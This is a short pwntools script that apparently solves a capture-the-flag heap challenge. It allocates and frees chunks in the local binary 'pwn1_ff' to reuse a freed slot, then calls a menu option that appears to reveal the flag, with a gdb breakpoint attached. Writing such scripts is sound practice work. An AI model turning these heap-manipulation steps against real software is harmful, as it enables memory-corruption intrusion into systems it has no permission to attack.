from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./pwn1_ff', checksec=False)

p = process("./pwn1_ff")

gdb.attach(p, gdbscript='''
b*0x4009aa
''')

def create(size,data):
	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"Input size:", str(size))
	p.sendafter(b"Input data:", data)

def free(idx):
	p.sendlineafter(b">", b"2")
	p.sendafter(b"Input index:", str(idx)) 
def flag():
    p.sendlineafter(b">", b"4")


create(16,p64(0xABCDEF)*2)
create(16,p64(0xABCDEF)*2)
create(16,p64(0xABCDEF)*2)
free(2)
create(16,p64(0xABCDEF)*2)
flag()
#p.sendlineafter(b">",payload)
p.interactive()